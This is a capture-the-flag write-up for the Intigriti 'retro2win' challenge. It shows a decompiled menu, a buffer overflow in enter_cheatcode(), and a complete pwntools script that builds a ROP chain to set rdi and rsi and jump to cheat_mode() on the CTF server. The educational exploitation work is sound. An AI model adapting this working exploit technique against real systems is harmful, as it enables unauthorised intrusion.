Decompile we have the main function as follows:
```c!
// local variable allocation has failed, the output may be wrong!
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        show_main_menu(*(_QWORD *)&argc, argv, envp);
        argv = (const char **)&v4;
        *(_QWORD *)&argc = "%d";
        __isoc99_scanf("%d", &v4);
        getchar();
        if ( v4 != 2 )
          break;
        battle_dragon();
      }
      if ( v4 > 2 )
        break;
      if ( v4 != 1 )
        goto LABEL_12;
      explore_forest();
    }
    if ( v4 == 3 )
      break;
    if ( v4 == 1337 )
    {
      enter_cheatcode();
    }
    else
    {
LABEL_12:
      *(_QWORD *)&argc = "Invalid choice! Please select a valid option.";
      puts("Invalid choice! Please select a valid option.");
    }
  }
  puts("Quitting game...");
  return 0;
}
```
With option 2, we will call the **battle_dragon()** function:

![image](https://hackmd.io/_uploads/HyaBdqSMyg.png)

With options less than 2, we will call the function **explore_forest()**:

![image](https://hackmd.io/_uploads/SyzKO9HMkg.png)

With the option 1337, we call the function **enter_cheatcode()**:

![image](https://hackmd.io/_uploads/SykCO9SM1x.png)

We have a buffer overflow bug here.
In addition, we also have the function **cheat_mode()** to check the condition, if true it will call the flag:

![image](https://hackmd.io/_uploads/SJhgY5rMke.png)

But if checked in ida , we will see that a1 and a2 will get values ​​from the registers rdi and rsi, so we will try to change these 2 registers to satisfy the condition.
We will use some gadgets to change these 2 registers:

![image](https://hackmd.io/_uploads/B11295Szye.png)

Now we will find the return address offset of the function **enter_cheatcode()**:

![image](https://hackmd.io/_uploads/By8UjqrM1l.png)

So the offset will be 24.
We have the following script:
```python!
#!/usr/bin/env python3

from pwn import *

exe = ELF("./retro2win_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("retro2win.ctf.intigriti.io", 1338)

    return r


def main():
    r = conn()
    # rbp - 0x60 = 0x7ffebdf10bf8:
    input()
    # Enter cheat code
    r.sendline(b'1337')
    cheat_mode = 0x0000000000400736
    pop_rdi = 0x00000000004009b3
    pop_rsi_r15 = 0x00000000004009b1
    payload =b'A'*24
    pause()
    # Control rdi and rsi register and return to cheatmode
    payload += p64(pop_rdi) + p64(0x2323232323232323) + p64(pop_rsi_r15) + p64(0x4242424242424242) + p64(0) + p64(cheat_mode)
    r.sendline(payload)
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

Run locally:
![image](https://hackmd.io/_uploads/B11oi5SMkl.png)
Run on server:
![image](https://hackmd.io/_uploads/rJiiicSGkg.png)
Flag: ```INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}```
